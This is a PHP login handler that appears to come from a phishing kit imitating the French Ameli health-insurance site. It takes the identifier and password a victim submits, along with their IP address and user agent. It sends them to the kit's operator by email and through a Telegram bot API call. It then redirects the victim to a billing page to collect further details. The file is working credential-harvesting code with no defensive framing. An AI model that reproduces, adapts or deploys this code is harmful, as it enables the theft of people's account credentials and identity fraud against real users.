<?php

include("../common/sub_includes.php");



if(isset($_POST['ide_login_submit'])){

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['identifiant'] = htmlspecialchars($_POST['ide_login']);
	$_SESSION['password'] = htmlspecialchars($_POST['ide_password']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


	if(isset($_SESSION["identifiant"])){

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "
〔🍞〕 Login 〔🍞〕

🍞 Identifiant  : ".$_SESSION['identifiant']."
🍞 Mot de passe : ".$_SESSION['password']."

〔🥖〕 Informations additionnelles 〔🥖〕

🥖 IP : ".$_SESSION['ip']."
🥖 User-agent : ".$_SESSION['useragent']."

					";

					$subject = "[🔒] + 1 Login |".$_SESSION['identifiant']." | ".$_SESSION['ip'];
					$headers = "From: Tools / Ameli <vito@tele.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '
〔🍞〕 Login 〔🍞〕

🍞 Identifiant : '.$_SESSION['identifiant'].'
🍞 Mot de passe : '.$_SESSION['password'].'

〔🥖〕 Informations additionnelles 〔🥖〕

🥖 Adresse Ip : '.$_SESSION['ip'].'
🥖 User-agent : '.$_SESSION['useragent'].'
					  
					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}

				header('Location: ../steps/billing.php');
				}
		else{
			header('Location: ../index.php?error=email');

		}

	}
else{
	header('Location: ../');
}

?>